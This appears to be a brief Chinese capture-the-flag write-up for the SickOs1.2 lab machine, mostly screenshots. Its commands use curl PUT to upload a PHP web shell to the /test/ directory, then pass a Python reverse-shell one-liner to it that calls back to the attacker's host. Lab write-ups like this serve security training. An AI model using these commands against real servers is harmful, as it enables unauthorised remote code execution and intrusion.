# SickOs1.2

![image-20200619213638254](assets/SickOs1.2.assets/image-20200619213638254.png)



![image-20200619213758347](assets/SickOs1.2.assets/image-20200619213758347.png)



![image-20200619215228897](assets/SickOs1.2.assets/image-20200619215228897.png)

test打开是目录，先看看是否能put

![image-20200619215435696](assets/SickOs1.2.assets/image-20200619215435696.png)

![image-20200619215511209](assets/SickOs1.2.assets/image-20200619215511209.png)

也可以用curl确认

```bash
curl -v -X OPTIONS http://10.10.10.137/test/
```

![image-20200619215817463](assets/SickOs1.2.assets/image-20200619215817463.png)

```bash
 curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.10.10.137/test/evil.php
```

![image-20200619220854241](assets/SickOs1.2.assets/image-20200619220854241.png)

![image-20200619221002732](assets/SickOs1.2.assets/image-20200619221002732.png)

用一句话，但是没有得到shell

```bash
http://10.10.10.137/test/evil.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.128",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

尝试使用wget吧php rshell 上传过去以获得shell

![image-20200619222515058](assets/SickOs1.2.assets/image-20200619222515058.png)

![image-20200619222546121](assets/SickOs1.2.assets/image-20200619222546121.png)

